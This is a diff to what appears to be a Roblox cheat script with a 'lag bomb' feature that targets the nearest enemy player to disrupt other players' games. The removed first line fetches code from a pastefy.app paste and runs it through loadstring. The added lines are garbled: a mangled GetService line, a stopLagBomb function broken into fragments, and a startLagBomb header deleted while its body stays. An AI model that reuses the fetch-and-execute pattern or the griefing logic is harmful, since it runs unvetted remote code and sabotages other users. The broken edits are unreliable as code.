@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/NZCKYdm0/raw"))()
+local game GetService://pastefy.app/NZCKYdm0/raw"))()
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local StatsService = game:GetService("Stats")
@@ -334,12 +334,6 @@ local function getNearestEnemy()
     return closest
 end
 
-local function startLagBomb()
-    if lagging then return end
-    lagging = true
-    LagBtn.Text = "BOMBING..."
-    LagBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
-
     lagConnection = RunService.Heartbeat:Connect(function()
         local target = getNearestEnemy()
         if target then
@@ -381,10 +375,10 @@ local function startLagBomb()
     stopLagBomb()
 end
 
-local function stopLagBomb()
-    if lagConnection then
-        lagConnection:Disconnect()
-        lagConnection = nil
+local 
+    if lagConnection 
+        lagConnection
+        lagConnection = 
     end
     lagging = false
     LagBtn.Text = "lag em"
